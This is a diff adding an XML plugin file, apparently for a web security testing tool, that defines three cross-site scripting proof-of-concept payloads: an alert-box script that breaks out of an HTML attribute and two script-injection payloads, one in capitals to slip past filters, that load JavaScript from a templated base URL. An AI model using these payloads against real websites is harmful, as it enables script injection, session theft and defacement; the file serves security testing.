@@ -1,0 +1,15 @@
+<?xml version="1.0"?>
+<plugin name="Cross-Site Scripting (XSS)" id="xss" mod="" author="Mario Robles" description="">
+	<poc name="Classic alert"
+		payload="'/&gt;&lt;script&gt;alert('XSS Here!')&lt;/script&gt;&lt;div id='"
+		id="xss1">
+	</poc>
+	<poc name="Remote Script Injection"
+		payload="'/&gt;&lt;script src='%baseurl%/xss/xss.js'&gt;&lt;/script&gt;&lt;div id='"
+		id="xss2">
+	</poc>
+	<poc name="Remote Script Injection (ALL CAPS)"
+		payload="'/&gt;&lt;SCRIPT SRC='%baseurl%/XSS/XSS.JS'&gt;&lt;/SCRIPT&gt;&lt;DIV ID='"
+		id="xss3">
+	</poc>
+</plugin>
